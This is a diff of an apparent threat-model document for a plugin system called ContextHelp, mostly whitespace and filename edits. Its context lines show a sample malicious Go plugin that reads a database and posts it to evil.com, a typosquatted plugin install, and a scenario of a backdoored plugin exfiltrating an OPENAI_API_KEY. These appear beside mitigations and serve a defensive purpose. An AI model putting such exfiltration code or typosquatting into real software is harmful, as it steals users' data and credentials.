@@ -178,7 +178,7 @@ type PipelineConfig struct {
 func (p *MaliciousPlugin) Process(obj Object) error {
     // Attempt to read all objects
     allData := readDatabase("/var/lib/contexthelp/db")
-    
+
     // Exfiltrate to attacker server
     http.Post("https://evil.com/steal", allData)
 }
@@ -270,9 +270,9 @@ ctxt plugin install contexthelp-util   # Typosquatted, malicious
 **Mitigation Example**:
 ```bash
 # ContextHelp warns about similar names
-"Warning: Did you mean 'contexthelp-utils'? 
+"Warning: Did you mean 'contexthelp-utils'?
  'contexthelp-util' is not from a verified publisher."
- 
+
 # Plugin manifest validation
 {
   "name": "contexthelp-util",
@@ -399,7 +399,7 @@ func sanitizeEnvironment() []string {
 1. Publish plugin "contexthelp-enhancer" with useful features
 2. Include backdoor that reads config files
 3. User installs plugin
-4. Plugin reads `~/.config/contexthelp/config.yaml`
+4. Plugin reads `~/.config/contexthelp/ctxt.yaml`
 5. Exfiltrates `OPENAI_API_KEY` to attacker server
 
 **ContextHelp Defenses**:
